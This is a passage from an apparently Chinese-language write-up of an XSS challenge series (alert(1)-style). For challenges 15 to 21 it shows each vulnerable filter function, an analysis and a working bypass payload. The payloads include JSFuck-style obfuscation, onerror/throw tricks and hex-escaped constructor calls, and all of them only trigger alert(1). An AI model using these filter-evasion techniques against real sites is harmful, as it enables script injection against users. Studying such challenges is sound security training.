+<tr>
+<th>表达式</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;&#39;+!1</code></td>
+<td>false</td>
+</tr>
+<tr>
+<td><code>&#39;&#39;+!0</code></td>
+<td>true</td>
+</tr>
+<tr>
+<td><code>&#39;&#39;+&#123;&#125;[0]</code></td>
+<td>undefined</td>
+</tr>
+<tr>
+<td><code>&#39;&#39;+&#123;&#125;</code></td>
+<td>[object Object]</td>
+</tr>
+</tbody></table>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;sort&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">3</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;constructor&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">5</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;[<span class="hljs-number">0</span>])[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">3</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">2</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">5</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;alert&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">2</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">4</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>
+<p>构造<code>Payload</code>，长度为<code>241</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1]+(&#x27;&#x27;+!1)[2]+(&#x27;&#x27;+!1)[4]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="15-3-Payload"><a href="#15-3-Payload" class="headerlink" title="15.3 Payload"></a>15.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法一<br><span class="hljs-string">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br><span class="hljs-string">方法二</span><br><span class="hljs-string">&quot;</span>);[][(![]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]][([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+([][[]]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">2</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]]((![]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">4</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]+<span class="hljs-string">&#x27;(1)&#x27;</span>)()<span class="hljs-comment">//</span><br>方法三<br><span class="hljs-string">&quot;);[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1]+(&#x27;&#x27;+!1)[2]+(&#x27;&#x27;+!1)[4]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://image.mengsec.com/xss-alf.nu/20190611123259.pnghttp://" title="15"><img src="https://image.mengsec.com/xss-alf.nu/20190611123259.png" srcset="/img/loading.gif" alt="15" title="15"></a></p>
+<h2 id="16-RFC4627"><a href="#16-RFC4627" class="headerlink" title="16. RFC4627"></a>16. RFC4627</h2><h3 id="16-1-源码"><a href="#16-1-源码" class="headerlink" title="16.1 源码"></a>16.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">text</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">window</span>.the_easy_but_expensive_way_out = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        alert(i++)<br>    &#125;;<br><br>    <span class="hljs-comment">// &quot;A JSON text can be safely passed into JavaScript&#x27;s eval() function</span><br>    <span class="hljs-comment">// (which compiles and executes a string) if all the characters not</span><br>    <span class="hljs-comment">// enclosed in strings are in the set of characters that form JSON</span><br>    <span class="hljs-comment">// tokens.&quot;</span><br>    <span class="hljs-keyword">if</span> (! (<span class="hljs-regexp">/[^,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(text.replace(<span class="hljs-regexp">/&quot;(\\.|[^&quot;\\])*&quot;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)))) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> val = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;(&#x27;</span> + text + <span class="hljs-string">&#x27;)&#x27;</span>);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;&#x27;</span> + val);<br>        &#125; <span class="hljs-keyword">catch</span>(_) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Crashed: &#x27;</span> + _);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Rejected.&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="16-2-分析"><a href="#16-2-分析" class="headerlink" title="16.2 分析"></a>16.2 分析</h3><p>从代码来看，我们如果想要执行<code>alert(1)</code>，需要调用两次<code>the_easy_but_expensive_way_out</code>方法。<br>从正则来看，代码并没有限制我们使用<code>self</code>，因此我们可以借助<code>self</code>来调用全局方法<code>the_easy_but_expensive_way_out</code>。</p>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609195504.png" srcset="/img/loading.gif"></p>
+<p>在这里使用了一个小<code>trick</code></p>
+<ul>
+<li>在<code>JS</code>中让一个对象和一个值或者一个字符进行相加等运算，<code>JS</code>解析器会调用对象的<code>valueOf</code>方法来计算对象的值。</li>
+</ul>
+<p>因此我们可以传入一个对象，它的<code>valueOf</code>指向的是<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>方法，然后让这个对象与一个数字或者字符做运算，就能调用<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>了，但是需要<code>alert(1)</code>，所以需要我们调用两次。</p>
+<blockquote>
+<p>参考链接 </p>
+<p><a target="_blank" rel="noopener" href="https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html</a></p>
+</blockquote>
+<h3 id="16-3-Payload"><a href="#16-3-Payload" class="headerlink" title="16.3 Payload"></a>16.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;valueOf&quot;</span>:self[<span class="hljs-string">&quot;the_easy_but_expensive_way_out&quot;</span>]&#125;+<span class="hljs-number">0</span>,&#123;<span class="hljs-string">&quot;valueOf&quot;</span>:self[<span class="hljs-string">&quot;the_easy_but_expensive_way_out&quot;</span>]&#125;<br></code></pre></td></tr></table></figure>
+<p>第一次调用是在<code>eval</code>中，通过<code>&#123;&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]&#125;+0</code>调用，第二次是在<code>console.log(&#39;&#39; + val);</code>中，对象与字符进行了相加操作，从而调用了<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>方法。</p>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609202135.png" srcset="/img/loading.gif"></p>
+<h2 id="17-Well"><a href="#17-Well" class="headerlink" title="17. Well"></a>17. Well</h2><h3 id="17-1-源码"><a href="#17-1-源码" class="headerlink" title="17.1 源码"></a>17.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    http: <span class="hljs-comment">//www.avlidienbrunn.se/xsschallenge/</span><br>    s = s.replace(<span class="hljs-regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt; var email = &#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;; &lt;\/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="17-2-分析"><a href="#17-2-分析" class="headerlink" title="17.2 分析"></a>17.2 分析</h3><p>代码过滤了<code>\r</code>、<code>\n</code>、<code>\u2028</code>、<code>\u2029</code>、<code>\</code>、<code>;</code>、<code>,</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>和<code>&lt;</code>。<br>单引号没被过滤，可以闭合前面的语句，通过定义函数来执行代码。</p>
+<p>在<code>Payload</code>中，我们借助了<code>new Function</code><a target="_blank" rel="noopener" href="https://zh.javascript.info/new-function">语法</a>。</p>
+<h3 id="17-3-Payload"><a href="#17-3-Payload" class="headerlink" title="17.3 Payload"></a>17.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;+new Function `a$&#123;&#x27;</span>alert<span class="hljs-string">&#x27;+String.fromCharCode`40`+1+String.fromCharCode`41`&#125;`+&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609204450.png" srcset="/img/loading.gif"></p>
+<h2 id="18-No"><a href="#18-No" class="headerlink" title="18. No"></a>18. No</h2><h3 id="18-1-源码"><a href="#18-1-源码" class="headerlink" title="18.1 源码"></a>18.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = s.replace(<span class="hljs-regexp">/[()`&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// no function calls</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;var string = &quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;;\n&#x27;</span> + <span class="hljs-string">&#x27;console.log(string);\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="18-2-分析"><a href="#18-2-分析" class="headerlink" title="18.2 分析"></a>18.2 分析</h3><p>代码过滤了<code>(</code>、<code>）</code>、<code>\</code>、<code>&lt;</code>、但是没有过滤双引号，可以通过双引号来闭合前面的语句。<br>然后借助异常处理来执行代码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;;onerror=eval;throw&#x27;=alert\x281\x29&#x27;//</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>参考链接<br><a target="_blank" rel="noopener" href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/">http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</a></p>
+</blockquote>
+<h3 id="18-3-Payload"><a href="#18-3-Payload" class="headerlink" title="18.3 Payload"></a>18.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;;onerror=eval;throw&#x27;=alert\x281\x29&#x27;//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190608100125.png" srcset="/img/loading.gif"></p>
+<h2 id="19-K’Z’K-1"><a href="#19-K’Z’K-1" class="headerlink" title="19. K’Z’K 1"></a>19. K’Z’K 1</h2><h3 id="19-1-源码"><a href="#19-1-源码" class="headerlink" title="19.1 源码"></a>19.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>	<span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span><br>	s = s.replace(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="19-2-分析"><a href="#19-2-分析" class="headerlink" title="19.2 分析"></a>19.2 分析</h3><p>正则过滤了<code>aeiouy</code>这些字符。可以借助匿名函数和编码来绕过。<br>首先构造匿名函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;pop&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure>
+<p>将其中的被过滤的字符进行16进制编码。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> ==&gt; \x61<br><span class="hljs-attr">e</span> ==&gt; \x65<br><span class="hljs-attr">i</span> ==&gt; \x69<br><span class="hljs-attr">o</span> ==&gt; \x6f<br><span class="hljs-attr">u</span> ==&gt; \x75<br><span class="hljs-attr">y</span> ==&gt; \x79<br></code></pre></td></tr></table></figure>
+<p>此时Payload为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;p\x6fp&quot;</span>][<span class="hljs-string">&quot;c\x6fnstr\x75ct\x6fr&quot;</span>](<span class="hljs-string">&#x27;\x61l\x65rt(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure>
+<p>再将前后的语句闭合即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\x6fp<span class="hljs-string">&quot;][&quot;</span>c\x6fnstr\x75ct\x6fr<span class="hljs-string">&quot;](&#x27;\x61l\x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<h3 id="19-3-Payload"><a href="#19-3-Payload" class="headerlink" title="19.3 Payload"></a>19.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\x6fp<span class="hljs-string">&quot;][&quot;</span>c\x6fnstr\x75ct\x6fr<span class="hljs-string">&quot;](&#x27;\x61l\x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190607151941.png" srcset="/img/loading.gif"></p>
+<h2 id="20-K’Z’K-2"><a href="#20-K’Z’K-2" class="headerlink" title="20. K’Z’K 2"></a>20. K’Z’K 2</h2><h3 id="20-1-源码"><a href="#20-1-源码" class="headerlink" title="20.1 源码"></a>20.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// remove vowels and escape sequences in honor of K&#x27;Z&#x27;K </span><br>    <span class="hljs-comment">// y is only sometimes a vowel, so it&#x27;s only removed as a literal</span><br>    s = s.replace(<span class="hljs-regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span><br>    s = s.replace(<span class="hljs-regexp">/[&#123;&#125;!=&lt;&gt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="20-2-分析"><a href="#20-2-分析" class="headerlink" title="20.2 分析"></a>20.2 分析</h3><p>正则看起来很复杂，不过是将编码的字符串替换为空了，双写一下就能绕过。</p>
+<h3 id="20-3-Payload"><a href="#20-3-Payload" class="headerlink" title="20.3 Payload"></a>20.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\\x6fx6fp<span class="hljs-string">&quot;][&quot;</span>c\\x6fx6fnstr\\x75x75ct\\x6fx6fr<span class="hljs-string">&quot;](&#x27;\\x61x61l\\x65x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190607153357.png" srcset="/img/loading.gif"></p>
+<h2 id="21-K’Z’K-3"><a href="#21-K’Z’K-3" class="headerlink" title="21. K’Z’K 3"></a>21. K’Z’K 3</h2><h3 id="21-1-源码"><a href="#21-1-源码" class="headerlink" title="21.1 源码"></a>21.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span><br>    s = s.replace(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span><br>    s = s.replace(<span class="hljs-regexp">/[&#123;&#125;!=&lt;&gt;\\]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="21-2-分析"><a href="#21-2-分析" class="headerlink" title="21.2 分析"></a>21.2 分析</h3><p>比第一题多了一个过滤，不仅过滤了<code>aeiouy</code>，还过滤了<code>&#123;</code>、<code>&#125;</code>、<code>!</code>、<code>=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>\</code>。这下不能用编码来绕过了。<br>类似于第15题。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;map&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure>
+<p>在Payload中，不符合条件的字符<code>aeou</code>。借助js的一些特性可以获取到。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][[]]+[] === <span class="hljs-string">&quot;undefined&quot;</span><br>([][[]]+[])[<span class="hljs-number">0</span>] === <span class="hljs-string">&quot;u&quot;</span><br>([][[]]+[])[<span class="hljs-number">3</span>] === <span class="hljs-string">&quot;e&quot;</span><br><br><span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[] === <span class="hljs-string">&quot;NaN&quot;</span><br>(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>] === <span class="hljs-string">&quot;a&quot;</span><br>[][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[] === <span class="hljs-string">&quot;function map() &#123; [native code] &#125;&quot;</span><br>([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>] === <span class="hljs-string">&quot;o&quot;</span><br></code></pre></td></tr></table></figure>
+<p>这样所有的字符就都获取到了，修改一下<code>Payload</code></p>
